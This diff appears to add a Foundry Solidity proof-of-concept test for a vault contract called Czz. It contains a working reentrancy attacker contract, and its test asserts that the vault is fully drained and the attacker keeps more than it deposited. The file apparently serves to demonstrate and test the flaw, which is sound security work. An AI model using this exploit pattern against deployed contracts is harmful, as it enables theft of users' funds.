@@ -1,0 +1,48 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+contract ReentrancyAttacker {
+    Czz public vault;
+    uint256 public deposited;
+
+    constructor(Czz v) {
+        vault = v;
+    }
+
+    function attack() external payable {
+        deposited = msg.value;
+        vault.fzzDeposit{value: msg.value}();
+        vault.fzzWithdraw();
+    }
+
+    receive() external payable {
+        if (address(vault).balance >= deposited) {
+            (bool ignored,) = address(vault).call(abi.encodeWithSignature("fzzWithdraw()"));
+            ignored; // reentry reverts on a patched vault; ignore and let the exploit finish
+        }
+    }
+}
+
+contract PocTest is Test {
+    Czz internal vault;
+    address internal victim = makeAddr("victim");
+    ReentrancyAttacker internal attacker;
+
+    function setUp() public {
+        vault = new Czz();
+        vm.deal(victim, 5 ether);
+        vm.prank(victim);
+        vault.fzzDeposit{value: 5 ether}();
+        attacker = new ReentrancyAttacker(vault);
+        vm.deal(address(this), 1 ether);
+    }
+
+    function test_reentrancyDrainsVault() public {
+        attacker.attack{value: 1 ether}();
+        assertEq(vault.fzzTotal(), 0, "vault fully drained");
+        assertGt(address(attacker).balance, 1 ether, "attacker stole more than it deposited");
+    }
+}
